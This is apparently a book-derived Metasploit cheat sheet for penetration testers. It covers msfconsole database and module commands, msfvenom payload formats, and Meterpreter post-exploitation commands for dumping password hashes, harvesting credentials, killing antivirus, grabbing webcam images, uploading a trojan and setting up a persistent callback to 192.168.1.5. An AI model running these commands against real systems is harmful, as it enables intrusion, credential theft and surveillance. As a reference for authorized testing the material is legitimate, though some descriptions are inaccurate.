- en: Metasploit Cheat Sheet
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Before starting the exploitation phase, you must know the Metasploit framework
    from start to finish, so I have prepared a quick reference (a cheat sheet) to
    the Metasploit framework for you.
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit framework
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Start a Metasploit with the following script file:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: 'To run Metasploit, use the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: Using the database
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In Kali Linux, you will need to start up the `postgresql` server before using
    the database:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'After starting `postgresql`, you will need to create and initialize the `msf`
    database with `msfdb init`:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'If you just created a new exploit and want to refresh `metasploit db` to start
    using the newly created exploit, enter the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: 'Then, type the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: The `-q` will start `msfconsole` in debug mode, so if you made mistakes in your
    new exploit class, the debugger will then print it to the screen.
  prefs: []
  type: TYPE_NORMAL
- en: More database-related commands
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '`msf > db_status`: This will confirm that Metasploit is successfully connected
    to the database'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > workspace`: This will display the currently selected workspaces'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > workspace [new workspace]`: This changes the current workspace to the
    new one selected'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > workspace -a [the name of the workspace to add]`: This is the name of
    the workspace to add'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > workspace -d [the name of the workspace to delete]`: This is the name
    of the workspace to delete'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > db_import [XML folder path]`: This will import a file from an earlier
    scan, for example, `db_import /root/msfu/nmapScan`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > db_nmap [nmap arguments]`: This will scan using Nmap, for example, `db_nmap
    -A 172.16.194.134`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > hosts`: This will list the hosts after a scan'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > services`: This will list the services found after a scan'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > creds`: This will list any found credentials after a brute-force scan'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > loot`: This will retrieve hash dumps if you have already compromised
    a system'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > db_export -f [format] [xml file path]`: For example, `-``db_export -f
    xml /root/msfu/Exported.xml`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Getting around
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '`msf > search`: This will locate a specific module according to the search
    criteria that you provide (try to execute `help search`)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > search [any keyword]`: For example, `search apache version 2.3`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > grep & search`: For example, `grep http search apache`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Search keywords**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`app`: Modules that are client or server attacks'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`author`: Modules written by this author'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`bid`: Modules with a matching Bugtraq ID'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`cve`: Modules with a matching CVE ID'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`edb`: Modules with a matching Exploit-DB ID'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`name`: Modules with a matching descriptive name'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`platform`: Modules affecting this platform'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`ref`: Modules with a matching `ref`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`type`: Modules of a specific type (exploit, auxiliary, or post)'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Examples**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > search cve:2009 type:exploit app:client`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > search name:mysql`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > search platform:windows`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > search type:auxiliary`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '**More commands**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > help`: List the available commands'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > back`: Go back one step'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > exit`: Exit msfconsole'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Using modules
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '`msf > use [module name]`: Select a module to use it. For example, use `dos/windows/smb/ms09_001_write`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > show`: This will show info about a specific item in Metasploit.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > show`: Entering `show` at the `msfconsole` prompt will display every
    module within Metasploit.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > show options`: This will show the module options.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > show auxiliary`: This will display a list of all of the available auxiliary
    modules within Metasploit.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > show exploits`: This will get a listing of all exploits contained in
    the framework.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > show payloads`: This will display all of the different payloads (either
    within Metasploit or in the same module).'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > show targets`: This will display which targets are supported within
    the context of an exploit module.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > show advanced`: This will show you more advanced options if you wish
    to further fine-tune an exploit.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > show encoders`: This will display a list of the encoders that are available
    within msfconsole.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > show nops`: This will display the NOP generators that Metasploit has
    to offer.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > info [module name]`: This will provide you with detailed information
    about a module. For example, `info exploit/windows/http/apache_chunked`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > check`: This will verify whether the target is vulnerable, but you will
    need to set the options first.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > set`: The `set` command allows you to configure the framework options
    and parameters for the current module you are working with. For example, `set
    RHOST 172.16.194.134`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > setg`: This will set global variables within `msfconsole`. For example, `setg
    LHOST 10.0.0.100`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > unset`: The `unset` command removes a parameter that has been previously
    configured with `set`. You can remove all assigned variables with `unset all`.
    For example, `unset THREADS`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > save`: The `save` command will save your current environment and settings.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > jobs [option]`: The `jobs` command provides the ability to list and
    terminate these jobs. Use the `jobs -h` command to get the available options.
    For example, `jobs -l`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Miscellaneous
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '`msf > load [plugin name]`: The `load` command loads a plugin from Metasploit''s
    plugin directory. Arguments are passed as `key=val` on the shell. For example,
    `load pcap_log`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > unload [plugin name]`: The `unload` command unloads a previously loaded
    plugin and removes any extended commands. For example, `unload pcap_log`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > loadpath [module path]`: The `loadpath` command will load a third-party
    module tree for the path so you can point Metasploit at your 0-day exploits, encoders,
    payloads, and so on. For example, `loadpath exploit/windows/test/test_module`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > connect [IP]`: This is similar to `netcat`. It is good for banner grabbing
    and interacting with the service. For example, `connect 192.168.1.10`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: msfvenom
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '`msfvenom` can be used, for example, to generate a reverse TCP Meterpreter
    payload for Windows OS:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: '**Platforms**: The following are the platform values that we can use:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`Cisco` or `cisco`, `OSX` or `osx`, `Solaris` or `solaris`, `BSD` or `bsd`, `OpenBSD`
    or `openbsd`, `hardware`, `Firefox` or `firefox`, `BSDi` or `bsdi`, `NetBSD` or
    `netbsd`, `NodeJS` or `nodejs`, `FreeBSD` or `freebsd`, `Python` or `python`,
    `AIX` or `aix`, `JavaScript` or `javascript`, `HPUX` or `hpux`, `PHP` or `php`,
    `Irix` or `irix`, `Unix` or `unix`, `Linux` or `linux`, `Ruby` or `ruby`, `Java`
    or `java`, `Android` or `android`, `Netware` or `netware`, `Windows` or `windows`,
    `mainframe`, `multi`.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Executable formats**: The following are the executable formats that we can
    use:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`asp`, `aspx`, `aspx-exe`, `dll`, `elf`, `elf-so`, `exe`, `exe-only`, `exe-service`,
    `exe-small`, `hta-psh`, `loop-vbs`, `macho`, `msi`, `msi-nouac`, `osx-app`, `psh`,
    `psh-net`, `psh-reflection`, `psh-cmd`, `vba`, `vba-exe`, `vba-psh`, `vbs`, `war`.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Transform formats**: The following are the transform formats that we can
    use:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`bash`, `c`, `csharp`, `dw`, `dword`, `hex`, `java`, `js_be`, `js_le`, `num`,
    `perl`, `pl`, `powershell`, `ps1`, `py`, `python`, `raw`, `rb`, `ruby`, `sh`,
    `vbapplication`, `vbscript`.'
  prefs: []
  type: TYPE_NORMAL
- en: Listener scripting
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: Meterpreter
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '`msf > sessions [options or ID]`: The `sessions` command allows you to list,
    interact with, and kill spawned sessions. The sessions can be shells, Meterpreter
    sessions, VNCs, and so on (use `sessions -h` to get help).'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > background`: This will send the current Meterpreter session
    to the background and return you to the `msf` prompt.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > getuid`: Displays to the user whether the Meterpreter server
    is running on the host.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > sysinfo`: Displays the victim''s OS info.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > cd`: Changes the current directory on the compromised system.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > ls`: Lists the current directory''s contents.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > pwd`: Prints the current directory on the compromised system.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > ps`: Displays a list of running processes on the target.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run post/windows/manage/migrate`: Migrates to another process
    on the victim.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > use priv`:  Use this command before executing the `getsystem`
    command.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > getsystem`: Use this command to elevate your privileges.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'If you get the error `priv_elevate_getsystem: Operation failed: Access is denied`,
    then follow these steps:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: '**Option 1**:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: '**Option 2**:'
  prefs: []
  type: TYPE_NORMAL
- en: '`msf > use exploit/windows/local/`: List of all Windows exploits.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msf > use exploit/windows/local/ms10_015_kitrap0d`: We''ve chosen one exploit
    from the list, as follows:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: '`meterpreter > search`: Provides a way of locating specific files on the target
    host. For example, `search -f passwords*.txt`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > cat [file name path]`: Displays the content of a file when it''s
    given as an argument.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > download [file name path]`: Downloads a file from the remote
    machine. Note the use of the double-slashes when giving the Windows path. For
    example, `download C:\\passwords.txt`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > upload [local file name] [remote path]`: For example, `upload
    evil_trojan.exe c:\\windows\\system32`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > execute [command]`: Runs a command on the target system'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > shell`: Executes the shell (Terminal or DOS) on the target system.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run post/windows/gather/hashdump`: A post module that will dump
    the contents of the SAM database.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter >ipconfig`: Displays the network interfaces and addresses on the
    remote machine.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > webcam_list`: Displays the currently available webcams on the
    target host.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > webcam_snap`: Grabs a picture from a connected webcam on the
    target system and saves it to disc as a JPEG image. By default, the save location
    is the local current working directory with a randomized filename. For example,
    `webcam_snap -i 1 -v false`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > python_import [local python file]`: Imports a local Python file
    and executes it on the victim''s machine. For example,  `meterpreter > python_import
    -f /root/readAutoLogonREG.py`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run post/windows/gather/checkvm`: Checks to see if the compromised
    host is a virtual machine.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run post/windows/gather/credentials/credential_collector`: Harvests
    passwords hashes and tokens on the compromised host.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run post/windows/gather/dumplinks`: The `dumplinks` module parses
    the `.lnk` files in a user''s recent documents, which could be useful for further
    information gathering.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run post/windows/gather/enum_applications`: Enumerates the applications
    that are installed on the compromised host.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run post/windows/gather/enum_logged_on_users`: Returns a list
    of current and recently logged on users, along with their SIDs.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run post/windows/gather/enum_shares`: Returns a list of both
    configured and recently used shares on the compromised system.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run post/windows/gather/enum_snmp`: Enumerates the SNMP service
    configuration on the target, if present, including the community strings.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run post/windows/gather/hashdump`: Dumps the local users'' accounts
    on the compromised host using the registry.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run post/windows/gather/usb_history`: Enumerates the USB drive
    history on the compromised system.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run getcountermeasure`: Checks the security configuration on
    the victims'' system and can disable other security measures, such as A/V, the
    firewall, and much more.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run getgui -e`: Enables RDP on a target system if it is disabled.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run gettelnet -e`: Enables Telnet on the victim if it is disabled.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run killav`: Disables most antivirus programs running as a service
    on a target.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run remotewinenum -u administrator -p password123 -t 10.0.0.100`:
    Enumerates the system information through `wmic` on the victim. Makes note of
    where the logs are stored.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run scraper`: Grabs the system information, including the entire
    registry'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run winenum`: This makes for a very detailed Windows enumeration
    tool. It dumps tokens, hashes, and much more.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`meterpreter > run persistence -U -i 10 -p 443 -r 192.168.1.5`: Configures
    our persistent Meterpreter session to wait until a user logs on to the remote
    system and tries to connect back to our listener every 10 seconds at IP address
    `192.168.1.5` on port `443`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
